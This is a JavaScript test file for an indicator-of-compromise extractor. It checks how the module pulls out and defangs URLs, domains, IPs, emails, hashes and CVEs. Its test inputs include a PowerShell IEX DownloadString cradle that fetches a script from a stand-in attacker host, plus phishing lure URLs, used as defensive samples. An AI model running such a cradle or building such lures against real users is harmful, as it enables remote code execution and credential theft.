// Run with:  node --test tests/ioc.test.js
const test = require('node:test');
const assert = require('node:assert/strict');
const IOC = require('../js/ioc.js');

const types = (items) => items.map((i) => i.type + ':' + i.value);

test('extracts URL, host domain and IPv4 and defangs them', () => {
  const items = IOC.extract("IEX (New-Object Net.WebClient).DownloadString('https://cdn.evil-site.com/a.ps1'); $c='http://203.0.113.9:8080/b'");
  assert.deepEqual(types(items), [
    'URL:https://cdn.evil-site.com/a.ps1',
    'URL:http://203.0.113.9:8080/b',
    'Domain:cdn.evil-site.com',
    'IPv4:203.0.113.9'
  ]);
  assert.equal(items[0].defanged, 'hxxps[:]//cdn[.]evil-site[.]com/a.ps1');
  assert.equal(items[3].defanged, '203[.]0[.]113[.]9');
});

test('PowerShell / .NET type names and file names are not domains', () => {
  const items = IOC.extract('[System.IO.MemoryStream] Net.WebClient IO.Compression.GzipStream stage2.ps1 a.exe payload.bin Microsoft.PowerShell.Commands');
  assert.deepEqual(items, []);
});

test('version strings are not IPs; private ranges are tagged', () => {
  const items = IOC.extract('Wazuh 4.14.8 talks to 192.168.1.10, 10.0.0.5, 127.0.0.1 and 8.8.8.8');
  assert.deepEqual(types(items), ['IPv4:192.168.1.10', 'IPv4:10.0.0.5', 'IPv4:127.0.0.1', 'IPv4:8.8.8.8']);
  assert.deepEqual(items.map((i) => i.note), ['private', 'private', 'loopback', '']);
});

test('defanged input is re-fanged before extraction', () => {
  const items = IOC.extract('hxxps[:]//bad[.]site/x and admin[at]evil[.]ru');
  assert.deepEqual(types(items), ['URL:https://bad.site/x', 'Domain:bad.site', 'Email:admin@evil.ru']);
  assert.equal(items[2].defanged, 'admin[@]evil[.]ru');
});

test('hashes and CVEs', () => {
  const sha256 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
  const sha1 = 'da39a3ee5e6b4b0d3255bfef95601890afd80709';
  const md5 = 'D41D8CD98F00B204E9800998ECF8427E';
  const items = IOC.extract(`${sha256} ${sha1} ${md5} cve-2021-44228`);
  assert.deepEqual(types(items), ['SHA256:' + sha256, 'SHA1:' + sha1, 'MD5:' + md5.toLowerCase(), 'CVE:CVE-2021-44228']);
});

test('@ credential trick: real host reported, lure tagged', () => {
  const items = IOC.extract('https://login.microsoftonline.com@203.0.113.47/common/oauth2');
  const lure = items.find((i) => i.value === 'login.microsoftonline.com');
  assert.ok(lure);
  assert.equal(lure.note, 'lure (@ userinfo)');
  assert.ok(items.some((i) => i.type === 'IPv4' && i.value === '203.0.113.47'));
});

test('SafeLinks wrapper is tagged and nested URL is fully defanged', () => {
  const items = IOC.extract('https://nam12.safelinks.protection.outlook.com/?url=https://evil.com/x&data=05');
  const wrapper = items.find((i) => i.type === 'URL');
  assert.equal(wrapper.note, 'wrapper');
  assert.ok(!/https?:\/\//.test(wrapper.defanged), wrapper.defanged);
  assert.ok(wrapper.defanged.includes('hxxps[:]//evil[.]com/x'));
});

test('emails inside a URL query string are defanged too', () => {
  const [url] = IOC.extract('https://phish.example/login?user=cfo@contoso.com');
  assert.equal(url.defanged, 'hxxps[:]//phish[.]example/login?user=cfo[@]contoso[.]com');
});

test('defangText neutralises every indicator but keeps the script intact', () => {
  const text = "IEX (New-Object Net.WebClient).DownloadString('https://cdn.evil-site.com/a.ps1') # contact ops@evil-site.com via 203.0.113.9";
  const safe = IOC.defangText(text);
  assert.equal(safe, "IEX (New-Object Net.WebClient).DownloadString('hxxps[:]//cdn[.]evil-site[.]com/a.ps1') # contact ops[@]evil-site[.]com via 203[.]0[.]113[.]9");
  assert.equal(IOC.defangText('whoami /all'), 'whoami /all');
});

test('CSV export is defanged and escaped', () => {
  const csv = IOC.toCsv(IOC.extract('https://a.com/x,y'));
  assert.equal(csv.split('\n')[0], 'type,value_defanged,note');
  assert.ok(csv.includes('"hxxps[:]//a[.]com/x,y"'));
});

test('empty and non-string input', () => {
  assert.deepEqual(IOC.extract(''), []);
  assert.deepEqual(IOC.extract(null), []);
  assert.equal(IOC.defangText(''), '');
});
